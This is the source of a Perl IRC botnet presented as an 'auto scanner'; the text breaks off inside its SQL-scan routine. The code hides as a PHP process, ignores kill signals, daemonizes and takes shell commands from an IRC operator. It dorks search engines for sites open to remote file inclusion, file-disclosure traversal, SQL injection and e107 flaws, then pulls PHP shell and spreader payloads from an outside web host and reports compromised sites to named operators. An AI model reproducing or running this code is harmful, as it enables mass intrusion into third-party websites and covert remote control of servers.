#!/usr/bin/perl

###########################################################
# please make this scanner but dont changes this code !!  #
# contact: team_elite@auzs.net | http://priasantai.uni.cc #
###########################################################

# usage : perl blackmetal

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use IO::Socket::INET;
use Socket;
use HTTP::Request::Common;
use LWP::Simple;
use LWP 5.64;
use HTTP::Request::Common qw(POST);
use Digest::MD5 qw(md5_hex);
use MIME::Base64;			       
my $datetime = localtime;
my $fakeproc  	= "/usr/bin/php"; 
my $ircserver   = "irc.byroe.net";
my $ircport   	= "7000";
my $nickname  	= "scanner[".int(rand(10))."]";
my $ident     	= "auto";
my $channel   	= "#duwur";
my $admin    	= "picko";
my $fullname  	= "airmataNETWORK auto scanner";
my $rfilogo   = "8,1[8RFI8]8,1";
my $lfdlogo   = "8,1[8LFD8]8,1";
my $sqllogo   = "8,1[8SQL8]8,1";
my $e107logo  = "8,1[8e1078]8,1";
my $rficmd    = '-rf';
my $lfdcmd    = '-fd';
my $sqlcmd    = '-sq';
my $e107cmd   = '-e10';
my $cmdxml    = '-cx';
my $cmdlfi    = '-cl';
my $cmde107   = '-ce';

my $rfiid     = "http://www.kgia.or.kr/bbs/data/forum/1304900484/logx";
my $injector  = "http://www.kgia.or.kr/bbs/data/forum/1304900484/logv";
my $Auzssprd  = "http://www.kgia.or.kr/bbs/data/forum/1304900484/logz";

my @uagents   = ("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12","Mozilla/5.0 (Windows; U; Windows NT 5.1; pl-PL; rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5","Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1","Opera/9.99 (Windows NT 5.1; U; pl) Presto/9.9.9","Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-HK) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Seamonkey-1.1.13-1(X11; U; GNU Fedora fc 10) Gecko/20081112","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)");
my $uagent    = $uagents[rand(scalar(@uagents))];

my $success   = "\n [+] nob0dy Scanner\n [-] Loading Successfully ...\n [-] Process/PID : $fakeproc - $$\n";
{ print $success; }

my $lfdtest   = "../../../../../../../../../../../../../../../proc/self/environ%00";
my $lfdoutput = "root:(.+):(.+):(.+):(.+):(.+):(.+)";

$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
#$SIG{'PS'}    = 'IGNORE';

chdir("/");
$ircserver = "$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0" x 16;
my $pid = fork;
exit if $pid;
die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
my @domen = ("site:.org","site:.info","site:.net","site:.com","site:.edu","site:.mil","site:.int","site:.gov","site:.ac","site:.ad","site:.ae","site:.af","site:.ag","site:.ai","site:.al","site:.am","site:.an","site:.ao","site:.aq","site:.ar","site:.as","site:.asia","site:.at","site:.au","site:.aw","site:.ax","site:.az","site:.ba","site:.bb","site:.bd","site:.be","site:.bg","site:.bh","site:.bi","site:.bj","site:.bm","site:.bn","site:.bo","site:.br","site:.bs","site:.bt","site:.bw","site:.by","site:.bz","site:.ca","site:.cc","site:.cd","site:.cf","site:.cg","site:.ch","site:.ci","site:.ck","site:.cl","site:.cm","site:.cn","site:.co","site:.cr","site:.cu","site:.cv","site:.cx","site:.cy","site:.cz","site:.de","site:.dj","site:.dk","site:.dm","site:.do","site:.dz","site:.ec","site:.ee","site:.eg","site:.es","site:.eu","site:.fi","site:.fj","site:.fk","site:.fm","site:.fo","site:.fr","site:.gd","site:.ge","site:.gf","site:.gg","site:.gi","site:.gl","site:.gm","site:.gp","site:.gq","site:.gr","site:.gs","site:.gt","site:.gu","site:.gy","site:.hk","site:.hm","site:.hn","site:.hr","site:.ht","site:.hu","site:.id","site:.ie","site:.il","site:.im","site:.in","site:.io","site:.iq","site:.ir","site:.is","site:.it","site:.je","site:.jm","site:.jo","site:.jp","site:.ke","site:.kg","site:.kh","site:.ki","site:.km","site:.kn","site:.kr","site:.kw","site:.ky","site:.kz","site:.la","site:.lb","site:.lc","site:.li","site:.lk","site:.lr","site:.ls","site:.lt","site:.lu","site:.lv","site:.ly","site:.ma","site:.mc","site:.md","site:.me","site:.mg","site:.mk","site:.mo","site:.mn","site:.mp","site:.ms","site:.mt","site:.mu","site:.mv","site:.mw","site:.mx","site:.my","site:.mz","site:.na","site:.nc","site:.nf","site:.ng","site:.ni","site:.nl","site:.no","site:.nr","site:.nu","site:.nz","site:.om","site:.pa","site:.pe","site:.ph","site:.pg","site:.pk","site:.pl","site:.pn","site:.pr","site:.ps","site:.pt","site:.py","site:.qa","site:.re","site:.ro","site:.rs","site:.ru","site:.sa","site:.sb","site:.sd","site:.se","site:.sg","site:.sh","site:.si","site:.sk","site:.sl","site:.sm","site:.sn","site:.so","site:.sr","site:.st","site:.su","site:.sv","site:.sy","site:.sz","site:.tc","site:.tg","site:.th","site:.tj","site:.tk","site:.tn","site:.to","site:.tr","site:.tt","site:.tz","site:.tv","site:.tw","site:.ua","site:.ug","site:.uk","site:.us","site:.uy","site:.uz","site:.vc","site:.ve","site:.vg","site:.vi","site:.vn","site:.vu","site:.ws","site:.ye","site:.zm","site:.za","site:.zw");
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
	$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        my $versi   = "(4Auzsnet Scanner)";
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$versi");
        sleep (1);}}
sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick".int rand(1));
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $mynick +Bx");
        sendraw("JOIN $channel");
        sleep(1);
        sendraw("PRIVMSG $admin :Hi $admin saya siap !!!");
    }
}
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { &connector("$nickname", "$ircserver", "$ircport"); }
    select(undef, undef, undef, 0.01);
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;

        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
	    my $engine ="GooGLe,ReDiff,Bing,ALtaViSTa,AsK,UoL,YahOo,CluSty,GutSer,GooGle2,ExaLead,LyCos,VirgiLio,WebDe,HotBot,AoL,SaPo,DuCk,LyGo,YauSe,BaiDu,KiPoT,GiBLa,BLacK";
            if ($path eq $mynick) {
                if ($msg =~ /^PING (.*)/) {
                    sendraw("NOTICE $nick :PING $1");
                }
                if ($msg =~ /^VERSION/) {
                    sendraw("NOTICE $nick :VERSION mIRC v6.17 Khaled Mardam-Bey");
                }
                if ($msg =~ /^TIME/) {
                    sendraw("NOTICE $nick :TIME ".$datetime."");
                }
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
                    sendraw("NICK ".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$");
                }
                if (&isAdmin($nick) && $msg !~ /^!/) {
                    &shell("$nick","$msg");
                }
           }
            else {
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg eq "!part") {
                    sendraw("PART $path");
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^\!x (.*)/) {
                    &shell("$path","$1");
                }
                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
                    &shell("$path","$1");
                }
                ################################################################################# HELP COMMAND

                if ($msg=~ /^!bantu/) {
                    my $helplogo = "8,1(8Help8)8,1";
                    &msg("$path","$helplogo 8,1 4$rficmd8,1||4$lfdcmd8,1||4$sqlcmd8,1||4$e107cmd8,1 4[bug] [dork] 3");
                    &msg("$path","$helplogo 8,1 4$cmdlfi8,1||4$cmdxml8,1||4$cmde1078,1 4[target] [cmd] 3");
                }
                if ($msg=~ /^!respon/ || $msg=~ /^!id/) {
                    if (&isFound($injector,"7b17WyJ")) {
                        &notice("$nick","8,1(8Injector8)8 8,183PHP Shell is 3YES88");
                    } else {
                        &notice("$nick","8,1(8Injector8)8 PHP 8,183PHP Shell is 4NO88");
                    }
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    &notice("$nick","8,18@3PID888,1 8,18@3Process/ID88,1 8,18:8,18 8,1 $fakeproc - $$");
                }

		################################################################################# CMD Injector COMMANDS

		if ($msg=~ /^$cmdlfi\s+(.+?)\s+(.*)/){
		    my $url = $1."../../../../../../../../../../../../../../../proc/self/environ%00";
		    my $cmd = $2;
		    &cmdlfi($url,$cmd,$path);
		}
		if ($msg=~ /^$cmdxml\s+(.+?)\s+(.*)/){
		    my $url = $1;
		    my $cmd = $2;
		    &cmdxml($url,$cmd,$path);
		}
		if ($msg=~ /^$cmde107\s+(.+?)\s+(.*)/){
		    my $url = $1;
		    my $cmd = $2;
		    &cmde107($url,$cmd,$path);
		}

		################################################################################## RFI SCAN

                if ($msg=~ /^$rficmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($rfiid,"Auzsnet")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","$rfilogo 8,18Dork :4 $dork");
                                &msg("$path","$rfilogo 8,18Bugz :4 $bug");
                                &msg("$path","$rfilogo 8,18Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,1);
                            } else {
                                &msg("$path","[ $nick ] $rfilogo 8,183PHP Shell is 4SHIT88");
                            }
                        }
                        exit;
                    }
                }

		################################################################################# LFD SCAN

                if ($msg=~ /^$lfdcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","$lfdlogo 8,18Dork :4 $dork");
                            &msg("$path","$lfdlogo 8,18Bugz :4 $bug");
                            &msg("$path","$lfdlogo 8,18Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,2);
                        }
                        exit;
                    }
                }

		################################################################################# SQL SCAN

                if ($msg=~ /^$sqlcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","$sqllogo 8,18Dork :4 $dork");
                            &msg("$path","$sqllogo 8,18Bugz :4 $bug");
                            &msg("$path","$sqllogo 8,1814Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,3);
                        }
                        exit;
                    }
                }

		################################################################################# E107 SCAN

                if ($msg=~ /^$e107cmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"7b17WyJ")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","$e107logo 8,18Dork :4 $dork");
                                &msg("$path","$e107logo 8,18Bugz :4 $bug");
                                &msg("$path","$e107logo 8,1814Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,4);
                            } else {
                                &msg("$path","[ $nick ] $e107logo 8,183PHP Shell is 4SHIT88");
                            }
                        }
                        exit;
                    }
                }

		################################################################################# 

            }
        }

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                &parse("$line");
            } else {
                if ($#lines == 0) {
                    &parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    &parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    &parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}

#########################################

sub type () {
my ($chan,$bug,$dork,$engine,$type) = @_;
	if ($type == 1){$type=&rfi($chan,$bug,$dork,$engine);}
     elsif ($type == 2){$type=&lfd($chan,$bug,$dork,$engine);}
     elsif ($type == 3){$type=&sql($chan,$bug,$dork,$engine);}
     elsif ($type == 4){$type=&e107($chan,$bug,$dork,$engine);}
}
sub scan_start() {
my ($chan,$bug,$dork,$engine,$type) = @_;
my $scan_part = 1;
if ($scan_part == 1) {
&msg("$chan","8,1@3Engine Level $scan_part $bug $dork");
    if ($engine =~ /google/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GooGLe",$type);
        } exit; }
    }
	
    if ($engine =~ /google2/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GooGle2",$type);
        } exit; }
    }
	
    if ($engine =~ /bing/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"Bing",$type);
        } exit; }
    }
	
    if ($engine =~ /altavista/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ALtaViSTa",$type);
        } exit; }
    }
	
    if ($engine =~ /ask/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"AsK",$type);
        } exit; }
    }
sleep(100);&msg("$chan","8,1@3Please Wait 4! Until Done ...");
sleep(20);$scan_part = 2;
}	
if ($scan_part == 2) {
&msg("$chan","4Engine Level $scan_part $bug $dork");
    if ($engine =~ /uol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"UoL",$type);
        } exit; }
    }

    if ($engine =~ /yahoo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"YahOo",$type);
        } exit; }
    }
	
    if ($engine =~ /clusty/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"CluSty",$type);
        } exit; }
    }
	
    if ($engine =~ /gutser/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"GutSer",$type);
        } exit; }
    }
	
    if ($engine =~ /rediff/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ReDiff",$type);
        } exit; }
    }
sleep(100);&msg("$chan","8,1@3Please Wait 4! Until Done ...");
sleep(20);$scan_part = 3;
}	
if ($scan_part == 3) {
&msg("$chan","4Engine Level $scan_part $bug $dork");
    if ($engine =~ /virgilio/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"VirgiLio",$type);
        } exit; }
    }

    if ($engine =~ /webde/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"WebDe",$type);
        } exit; }
    }

    if ($engine =~ /exalead/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ExaLead",$type);
        } exit; }
    }
	
    if ($engine =~ /lycos/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"LyCos",$type);
        } exit; }
    }

    if ($engine =~ /hotbot/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"HotBot",$type);
        } exit; }
    }
sleep(100);&msg("$chan","8,1@3Please Wait 4! Until Done ...");
sleep(20);$scan_part = 4;
}
if ($scan_part == 4) {
&msg("$chan","4Engine Level $scan_part $bug $dork");
    if ($engine =~ /aol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"AoL",$type);
        } exit; }
    }
	
    if ($engine =~ /sapo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SaPo",$type);
        } exit; }
    }
	
    if ($engine =~ /duck/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"DuCk",$type);
        } exit; }
    }

    if ($engine =~ /lygo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"LyGo",$type);
        } exit; }
    }

    if ($engine =~ /yause/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"YauSe",$type);
        } exit; }
    }
sleep(100);&msg("$chan","8,1@3Please Wait 4! Until Done ...");
sleep(20);$scan_part = 5;
}
if ($scan_part == 5) {
&msg("$chan","4Engine Level $scan_part $bug $dork");
    if ($engine =~ /baidu/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"BaiDu",$type);
        } exit; }
    }

    if ($engine =~ /kipot/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"KiPoT",$type);
        } exit; }
    }

    if ($engine =~ /gibla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GiBLa",$type);
        } exit; }
    }

    if ($engine =~ /black/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"BLacK",$type);
        } exit; }
    }

    if ($engine =~ /onet/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"oNeT",$type);
        } exit; }
    }

    if ($engine =~ /sizuka/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SiZuka",$type);
        } exit; }
    }

    if ($engine =~ /walla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"WaLLa",$type);
        } exit; }
    }

    if ($engine =~ /demos/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"DeMos",$type);
        } exit; }
    }

    if ($engine =~ /rose/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"RoSe",$type);
        } exit; }
    }

    if ($engine =~ /seznam/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SeZnaM",$type);
        } exit; }
    }

    if ($engine =~ /tiscali/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"TisCali",$type);
        } exit; }
    }
    if ($engine =~ /naver/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"NaVeR",$type);
        } exit; }
    }

    if ($engine =~ /live/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"live",$type);
        } exit; }
    }

    if ($engine =~ /rakuten/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"rakuten",$type);
        } exit; }
    }

    if ($engine =~ /biglobe/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"biglobe",$type);
        } exit; }
    }

    if ($engine =~ /nova/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"nova",$type);
        } exit; }
    }

    if ($engine =~ /najdi/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"najdi",$type);
        } exit; }
    }

    if ($engine =~ /goo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"goo",$type);
        } exit; }
    }

    if ($engine =~ /uksubmit/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"uksubmit",$type);
        } exit; }
    }

    if ($engine =~ /excite/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"excite",$type);
        } exit; }
    }

    if ($engine =~ /amidalla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"amidalla",$type);
        } exit; }
    }

    if ($engine =~ /buscar/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"buscar",$type);
        } exit; }
    }

    if ($engine =~ /sogou/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"sogou",$type);
        } exit; }
    }

    if ($engine =~ /interia/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"interia",$type);
        } exit; }
    }

    if ($engine =~ /snz/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"snz",$type);
        } exit; }
    }

    if ($engine =~ /yandex/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"yandex",$type);
        } exit; }
    }

    if ($engine =~ /joeant/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"joeant",$type);
        } exit; }
    }

    if ($engine =~ /terra/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"terra",$type);
        } exit; }
    }

    if ($engine =~ /youdao/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"youdao",$type);
        } exit; }
    }

    if ($engine =~ /amfibi/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"amfibi",$type);
        } exit; }
    }

    if ($engine =~ /bigclique/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"bigclique",$type);
        } exit; }
    }

    if ($engine =~ /dancefloor/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"dancefloor",$type);
        } exit; }
    }
sleep(100);&msg("$chan","8,1@3Please Wait 4! Until Done ...");
sleep(20);$scan_part = 6;
}
if ($scan_part == 6) {
&msg("$chan","8,1@3Completed All Part for $bug $dork");
}
}

#########################################

sub rfi() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = search_engine($chan,$bug,$dork,$engine,$rfilogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$rfilogo8,1(8,1@3$engine8)8,18 Scan finish for $dork"); }
            my $rfixpl = "http://".$site.$bug.$rfiid."?";
            my $rfivuln = "http://".$site.$bug."4,1[shell.txt]?";
            my $rfisprd = "http://".$site.$bug.$Auzssprd."?";
            my $html = get_content($rfixpl);
            if ( $html =~ /Auzsnet/ && $html =~ /uid=/) {
                        os($rfixpl);
                        &get_content($rfisprd);
                        &msg("$chan","$rfilogo8,1(8,1@3$engine8)(RFI-Vuln)8,18 ".$rfivuln." 8,1".$un." 8,19(safemode-off)8,9");
                        &msg("picko","8,1(RFI-Vuln)8,1 ".$rfivuln." 8,1".$un." 8,19(safemode-off)8,9");
                        &msg("airmata","8,1(RFI-Vuln)8,1 ".$rfivuln." 8,1".$un." 8,19(safemode-off)8,9");
                        sleep(4);
                    }elsif 
               ( $html =~ /Auzsnet/) {
                        os($rfixpl);
                        &get_content($rfisprd);
                        &msg("$chan","$rfilogo8,1(8,1@3$engine8)(RFI-Vuln)8,18 ".$rfivuln." 8,1".$un." 8,14(safemode-on)8,4");
                        sleep(4);
            }
        }
    }
}

sub lfd() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$lfdlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$lfdlogo8,1(8,1@3$engine8)8,18 Scan finish for $dork"); }
            my $lfdxpl = "http://".$site.$bug.$lfdtest;
            my $lfdvuln = "http://".$site.$bug."8,1".$lfdtest;
            my $html = get_content($lfdxpl);
            if ($html =~ /$lfdoutput/) {
                &msg("$chan","$lfdlogo8,1(8,1@3$engine8)(LFD-Vuln)8,18 ".$lfdvuln." 8,13(safemode-off3)8,1");
                sleep(2);
            }
        }
    }
}

sub sql() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = search_engine($chan,$bug,$dork,$engine,$sqllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$sqllogo8,1(8,1@3$engine8)8,18 Scan finish for $dork"); }
            my $sqlxpl  = "http://".$site.$bug."'";
            my $sqlvuln = "http://".$site."4".$bug."1";
